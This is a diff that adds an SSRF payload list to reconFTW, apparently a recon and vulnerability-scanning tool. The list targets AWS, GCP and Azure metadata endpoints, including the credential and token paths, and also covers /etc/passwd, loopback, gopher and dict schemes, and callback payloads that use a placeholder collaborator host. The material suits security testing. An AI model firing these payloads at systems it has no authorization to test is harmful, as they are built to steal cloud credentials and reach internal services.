@@ -1,0 +1,43 @@
+# reconFTW - SSRF alternate-protocol payloads
+#
+# Used by: modules/vulns.sh:ssrf_checks()
+# Syntax:
+# - One payload per line.
+# - Lines starting with '#' are comments.
+# - Placeholders:
+#   - {COLLAB}      -> callback token/host (no scheme)
+#   - {COLLAB_URL}  -> callback URL with scheme
+#
+# Notes:
+# - These payloads are best-effort and may not apply to all SSRF sinks.
+# - Matching is controlled via SSRF_ALT_MATCH_REGEX in reconftw.cfg.
+
+# AWS IMDSv1
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# AWS IMDSv2 hint (some sinks ignore headers; still useful for response matching)
+http://169.254.169.254/latest/api/token
+
+# GCP metadata (common)
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Azure IMDS
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+# Local file (rare, but high impact)
+file:///etc/passwd
+
+# Loopback/common local panels
+http://127.0.0.1/
+http://localhost/
+
+# Alternate protocols (support varies by client libraries)
+gopher://127.0.0.1:80/_
+dict://127.0.0.1:11211/stats
+
+# Callback-based alternates (when sink allows non-http scheme)
+gopher://{COLLAB}:80/_
+dict://{COLLAB}:11211/stats
+
